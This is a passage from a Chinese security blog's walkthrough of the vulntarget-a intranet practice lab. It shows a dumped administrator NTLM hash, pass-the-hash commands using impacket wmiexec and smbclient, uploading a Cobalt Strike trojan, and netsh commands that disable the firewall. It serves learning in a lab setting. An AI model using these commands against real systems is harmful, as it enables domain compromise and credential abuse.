+<p>现在这个域已经被我们拿下来了接下来将win2019上传到cs上完善控制。</p>
+<p>看一下上方获取的凭证信息</p>
+<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::</p>
+<p>这条最为关键是管理员凭证，那么我们就可以直接利用该凭证进行登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-wmiexec vulntarget.com/administrator@10.0.10.110 -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507231658697-1778169646449-31.png" class="" title="image-20260507231658697" loading='lazy'>
+
+<p>这样即可登录成功，然后我们再去cs建立一个新的监听器然后利用smb去上传木马即可</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507231813109-1778169646449-34.png" class="" title="image-20260507231813109" loading='lazy'>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains impacket-smbclient vulntarget.com/administrator@10.0.10.110-hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507232235655-1778169646449-33.png" class="" title="image-20260507232235655" loading='lazy'>
+
+<p>之后我们在执行木马之前还需要关闭防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall show allprofiles # 查看防火墙配置</span><br><span class="line"></span><br><span class="line">netSh advfirewall set allprofiles state off # 关闭防火墙</span><br></pre></td></tr></table></figure>
+
+<p>在执行时需要Win2016 Beacon发起正向连接</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507232754830-1778169646449-35.png" class="" title="image-20260507232754830" loading='lazy'>
+
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507232806301-1778169646449-36.png" class="" title="image-20260507232806301" loading='lazy'>
+
+<p>我们可以看到已经上线成功</p>
+<p>接下来看一下cs呈现出的拓扑图是否是正确的</p>
+<img src="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20260507233040132-1778169646449-37.png" class="" title="image-20260507233040132" loading='lazy'>
+
+<p>我们可以看到这就是vulntarget-a该靶场的拓扑图，到这里该靶场已经完全被我们拿下来了。</p>
+<p>这算是我打的第一个内网靶场，确实在打的过程中学到了很多东西，搭建代理等等的操作都是之前没有了解过的东西以及渗透的思路。学长推荐的这个靶场确实很适合学习，感谢学长在打的过程中给的指导。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://n0neme.top">n0ne</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://n0neme.top/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/">https://n0neme.top/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://n0neme.top" target="_blank">n0ne</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/">内网靶场</a></div><div class="post-share"><div class="social-share" data-image="/images/covers/084531icbMy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>请我喝杯咖啡</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/images/f250d5c4214c73d9da7274f7859e6bcf.jpg" target="_blank"><img class="post-qr-code-img" src="/images/f250d5c4214c73d9da7274f7859e6bcf.jpg" alt="wechat"/ loading='lazy'></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/images/2c80a33a9ee98ce7a119652420620e7d.jpg" target="_blank"><img class="post-qr-code-img" src="/images/2c80a33a9ee98ce7a119652420620e7d.jpg" alt="alipay"/ loading='lazy'></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/04/26/Link2-%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/" title="Link2-群友靶机"><img class="cover" src="/images/covers/231121hqmBz.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post" loading='lazy'><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Link2-群友靶机</div></div><div class="info-2"><div class="info-item-1">LINK 靶机 WP最终拿到的 flag：  user: flag&#123;user-05851bbc17a30c08cebd70bb537a3115&#125; root: flag&#123;root-7ad90e080cbf6381a0930940d0879535&#125;   信息收集  发现开启了三个端口先访问下80 访问首页：  http://192.168.56.141/  页面只有一个标题：  12138  以及一张图片：  12138.jpg    发现图片上有12138的提示，那么重点应该是在该端口了  分析 12138 端口服务直接连接 12138 端口后，服务返回： 1Please enter a path  这说明它像是一个“输入路径然后读取文件”的自定义服务。   经过测试其必须在&#x2F;home&#x2F;user12138目录下那么在该目录下进行信息收集   可以在该目录发现flag 1flag&#123;user-05851bbc17a30c08cebd70bb537a3115&#125;  同时还可以读到一些高价值文件：.bash_hi...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/123.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="author-info-name">n0ne</div><div class="author-info-description">记录 CTF、Web 安全与渗透学习</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ZmRz1"><i class="fab fa-github"></i><span>GitHub</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulntarget-a%E9%9D%B6%E5%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">vulntarget-a靶场</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84"><span class="toc-number">2.</span> <span class="toc-text">拓扑结构</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9"><span class="toc-number">3.</span> <span class="toc-text">外围打点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E445%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F"><span class="toc-number">3.1.</span> <span class="toc-text">从445端口渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BE%BEoa%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">通达oa漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cs%E4%B8%8A%E7%BA%BF"><span class="toc-number">3.3.</span> <span class="toc-text">cs上线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.4.</span> <span class="toc-text">信息收集</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Server-2016"><span class="toc-number">4.1.</span> <span class="toc-text">Windows Server 2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-number">4.1.1.</span> <span class="toc-text">信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-sever-2019"><span class="toc-number">4.2.</span> <span class="toc-text">windows sever 2019</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/" title="vulntarget-a靶场学习"><img src="/images/covers/084531icbMy.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulntarget-a靶场学习"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/05/07/vulntarget-a%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/" title="vulntarget-a靶场学习">vulntarget-a靶场学习</a><time datetime="2026-05-07T15:37:07.000Z" title="发表于 2026-05-07 23:37:07">2026-05-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/26/Link2-%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/" title="Link2-群友靶机"><img src="/images/covers/231121hqmBz.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Link2-群友靶机"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/04/26/Link2-%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/" title="Link2-群友靶机">Link2-群友靶机</a><time datetime="2026-04-25T17:35:12.000Z" title="发表于 2026-04-26 01:35:12">2026-04-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/07/%E7%BA%A2%E6%97%A5%E5%BC%80%E5%90%AF%E7%9A%84%E5%9F%9F%E6%B8%97%E9%80%8F/" title="红日开启的域渗透"><img src="/images/covers/085124cXEz8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日开启的域渗透"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/01/07/%E7%BA%A2%E6%97%A5%E5%BC%80%E5%90%AF%E7%9A%84%E5%9F%9F%E6%B8%97%E9%80%8F/" title="红日开启的域渗透">红日开启的域渗透</a><time datetime="2026-01-07T12:40:39.000Z" title="发表于 2026-01-07 20:40:39">2026-01-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/01/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA%E4%B9%8BYuan-%E5%85%83%E6%97%A6%E9%9D%B6%E6%9C%BA/" title="群友靶机之Yuan(元旦靶机)"><img src="/images/covers/234520UpWP7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="群友靶机之Yuan(元旦靶机)"/ loading='lazy'></a><div class="content"><a class="title" href="/2026/01/01/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA%E4%B9%8BYuan-%E5%85%83%E6%97%A6%E9%9D%B6%E6%9C%BA/" title="群友靶机之Yuan(元旦靶机)">群友靶机之Yuan(元旦靶机)</a><time datetime="2026-01-01T13:44:50.000Z" title="发表于 2026-01-01 21:44:50">2026-01-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/22/tryharder%E9%9D%B6%E5%9C%BA/" title="tryhearder靶场"><img src="/images/covers/%E3%80%90%E5%93%B2%E9%A3%8E%E5%A3%81%E7%BA%B8%E3%80%91%E5%89%91-%E5%8F%A4%E9%A3%8E-%E5%BE%A1%E5%89%91%E9%A9%AD%E9%BE%99.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="tryhearder靶场"/ loading='lazy'></a><div class="content"><a class="title" href="/2025/12/22/tryharder%E9%9D%B6%E5%9C%BA/" title="tryhearder靶场">tryhearder靶场</a><time datetime="2025-12-22T09:08:46.000Z" title="发表于 2025-12-22 17:08:46">2025-12-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="footer-content"><span class="footer-text">© 2024 - 2026 n0ne</span><span class="footer-separator">|</span><span class="footer-text">Powered by<a href="https://hexo.io/" target="_blank" rel="noopener noreferrer"> Hexo</a> &<a href="https://butterfly.js.org/" target="_blank" rel="noopener noreferrer"> Butterfly</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><div class="js-pjax"></div><script src="/js/fish.js"></script><div id="global-aplayer"></div><script src="/js/global-aplayer-playlist.js"></script><script src="/js/global-aplayer.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
